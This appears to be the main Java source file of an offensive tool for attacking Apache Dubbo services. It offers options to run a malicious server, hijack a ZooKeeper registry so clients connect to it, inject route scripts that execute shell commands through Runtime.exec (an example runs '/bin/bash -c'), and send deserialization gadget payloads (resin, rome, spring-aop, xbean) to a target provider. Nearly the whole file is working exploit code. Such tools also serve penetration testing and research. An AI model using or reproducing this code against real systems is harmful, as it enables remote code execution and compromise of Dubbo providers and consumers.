package com.threedr3am.exp.dubbo;

import com.threedr3am.exp.dubbo.fastcheck.CheckDataCenter;
import com.threedr3am.exp.dubbo.fastcheck.CheckParams;
import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.payload.Payloads;
import com.threedr3am.exp.dubbo.protocol.Protocol;
import com.threedr3am.exp.dubbo.protocol.Protocols;
import com.threedr3am.exp.dubbo.serialization.Serialization;
import com.threedr3am.exp.dubbo.serialization.Serializations;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;

/**
 * @author threedr3am
 */
public class Main {

  public static void main(String[] args) throws ParseException {
    Options options = new Options()
        .addOption("h","help", false, "帮助信息")
        .addOption("e","evil", false, "恶意服务模式，也就是通过返回恶意序列化数据给客户端，从而攻击连接进来的服务")
        .addOption("evilHost", true, "恶意服务ip")
        .addOption("evilPort", true, "恶意服务port")
        .addOption("registry", true, "[zookeeper]，暂时仅实现了攻击zookeeper，恶意服务模式下，攻击注册中心，控制客户端连接到本恶意服务，也就是通过返回恶意序列化数据给客户端，从而攻击连接进来的服务")
        .addOption("scheme", true, "[auth|digest]，zookeeper认证类型")
        .addOption("username", true, "[zookeeperUsername]，zookeeper认证账号")
        .addOption("password", true, "[zookeeperPassword]，zookeeper认证密码，digest：要对passWord进行MD5哈希，然后再进行bese64")
        .addOption("registryURL", true, "zookeeper url，例：127.0.0.1:2181")
        .addOption("w","wait", true, "等待客户端连接超时时间（毫秒，默认等待5秒），一般业务调用频繁的，瞬间就会连接进来，但是业务不频繁的，可能等很久")
        .addOption("t", "target", true, "目标，例：-t 127.0.0.1:20880")
        .addOption("s", "serialization", true, "[hessian|java] 序列化类型")
        .addOption("p", "protocol", true, "[dubbo|http] 通讯协议名称，默认缺省dubbo")
        .addOption("dr", "dubbo-response", false, "当protocol=dubbo时，设置为response模式")
        .addOption("g", "gadget", true, "gadget名称，hessian可选[resin|rome|spring-aop|xbean]，java可选[]")
        .addOption("a", "args", true, "gadget入参，多个参数，需要多个命令传入，例-a http://127.0.0.1:800/ -a Calc")
        .addOption("l", "list", false, "输出所有payload信息")
        .addOption("f", "fastcheck", true, "快速攻击检查（使用预置参数数据文件，遍历所有gadget进行攻击检查），参数为数据文件路径，参考文件check.data")
        .addOption("route", true, "route攻击类型，例：script")
        .addOption("rule", true, "route script攻击类型脚本内容，例：\"s=[3];s[0]='/bin/bash';s[1]='-c';s[2]='open -a calculator';java.lang.Runtime.getRuntime().exec(s);\"")
        .addOption("routeDeleteTtl", true, "route攻击注入内容删除时间，恶意脚本后，为避免长时间导致consumer客户端异常，默认10秒钟后删除，自定义通过该参数设置删除时间，单位秒")
        ;

    //parser
    CommandLineParser parser = new DefaultParser();
    CommandLine cmd = parser.parse(options, args);

    boolean evil = cmd.hasOption("evil");
    String registry = cmd.hasOption("registry") ? cmd.getOptionValue("registry") : "";
    String evilHost = cmd.hasOption("evilHost") ? cmd.getOptionValue("evilHost") : "";
    int evilPort = cmd.hasOption("evilPort") ? Integer.parseInt(cmd.getOptionValue("evilPort")) : 23232;
    long wait = cmd.hasOption("wait") ? Long.parseLong(cmd.getOptionValue("wait")) : 5000L;
    String scheme = cmd.hasOption("scheme") ? cmd.getOptionValue("scheme") : "";
    String username = cmd.hasOption("username") ? cmd.getOptionValue("username") : "";
    String password = cmd.hasOption("password") ? cmd.getOptionValue("password") : "";
    String registryURL = cmd.hasOption("registryURL") ? cmd.getOptionValue("registryURL") : "";
    String route = cmd.hasOption("route") ? cmd.getOptionValue("route") : "";
    String rule = cmd.hasOption("rule") ? cmd.getOptionValue("rule") : "";
    Integer routeDeleteTtl = cmd.hasOption("routeDeleteTtl") ? Integer.parseInt(cmd.getOptionValue("routeDeleteTtl")) : 10;


    String protocol = cmd.hasOption("protocol") ? cmd.getOptionValue("protocol") : "dubbo";
    String serializationOpt = cmd.getOptionValue("serialization");

    if (cmd.hasOption("help")) {
      HelpFormatter formatter = new HelpFormatter();
      formatter.printHelp("java -jar exp.jar [OPTION]", options);
      return;
    }

    //展示gadget列表
    if (cmd.hasOption("list")) {
      Payloads[] payloads = Payloads.values();
      for (int i = 0; i < payloads.length; i++) {
        Payloads p = payloads[i];
        System.out.println("---------------------------------------------------------------------------------------------------------");
        System.out.println("1. 名称：" + p.getName());
        System.out.println("2. 需要入参数量：" + p.getParamSize());
        System.out.println("3. 参数说明：" + p.getParamTis());
        System.out.println("4. 序列化类型：" + p.getSerialization());
        System.out.println("5. 依赖：" + p.getDependency());
      }
      return;
    }

    //简单参数条件检查
    if (!evil && route.isEmpty() && !cmd.hasOption("target")) {
      System.err.println("目标不能为空，例：-t 127.0.0.1:20880");
      return;
    }

    //gadget反序列化payload生成
    String[] payloadArgs = cmd.getOptionValues("args");
    List<Payloads> payloadsList = new ArrayList<>();
    if (cmd.hasOption("fastcheck")) {
      CheckDataCenter.initFastCheckData(cmd.getOptionValue("fastcheck"));
      payloadsList = Payloads.getPayloads(serializationOpt);
    } else {
      if (payloadArgs != null && payloadArgs.length > 0) {
        Payloads payloadEnum = Payloads.getPayload(cmd.getOptionValue("gadget"), serializationOpt);
        if (payloadEnum == null) {
          System.err.println("gadget[" + cmd.getOptionValue("gadget") + "]不存在");
          return;
        }
        if (payloadEnum.getCheckParam() != CheckParams.CMD && payloadEnum.getParamSize() != payloadArgs.length) {
          System.err.println("gadget参数错误");
          System.err.println(payloadEnum.getParamTis());
          return;
        }
        payloadsList = new ArrayList();
        payloadsList.add(payloadEnum);
      } else if (route.isEmpty()) {
        System.err.println("gadget参数值不能为空，你必须输入一点参数来使gadget可以使用");
        return;
      }
    }

    //攻击consumer
    if (evil) {
      byte[][] payload = new byte[payloadsList.size()][];
      for (int i = 0; i < payloadsList.size(); i++) {
        Payloads p = payloadsList.get(i);
        Serialization serialization = Serializations.getSerialization(p.getSerialization());
        serialization.setPayload(p.getPayload());
        byte[] bytes = serialization.makeData(p.getPayload(), payloadArgs, protocol);

        Protocol protocolImpl = Protocols.getProtocol(protocol);
        Map<String, String> extraData = protocolImpl.initExtraData(cmd);
        bytes = protocolImpl.makeData(bytes, serialization, extraData);
        payload[i] = bytes;
      }
      new Exploit().evil(registryURL, scheme, username, password, evilHost, evilPort, registry != null && !registry.isEmpty(), payload, serializationOpt, wait);
      System.exit(1);
    } else if (!route.isEmpty()) {
      new Exploit().route(registryURL, scheme, username, password, route, rule, routeDeleteTtl);
      System.exit(1);
    }

    //攻击provider
    for (Payloads p:payloadsList) {
      Serialization serialization = Serializations.getSerialization(p.getSerialization());
      serialization.setPayload(p.getPayload());
      byte[] bytes = serialization.makeData(p.getPayload(), payloadArgs, protocol);

      String target = cmd.getOptionValue("target");
      String host = target;
      int port = 20880;
//      String path = "/";
      int index = target.indexOf("/");
      if (index != -1) {
//        path = target.substring(index);
        target = target.substring(0, index);
      }
      index = target.indexOf(":");
      if (index != -1) {
        host = target.substring(0, index);
        port = Integer.parseInt(target.substring(index + 1));
      }

      Protocol protocolImpl = Protocols.getProtocol(protocol);
      Map<String, String> extraData = protocolImpl.initExtraData(cmd);
      bytes = protocolImpl.makeData(bytes, serialization, extraData);

      new Exploit().attack(host, port, bytes);
    }
    System.exit(1);
  }

}
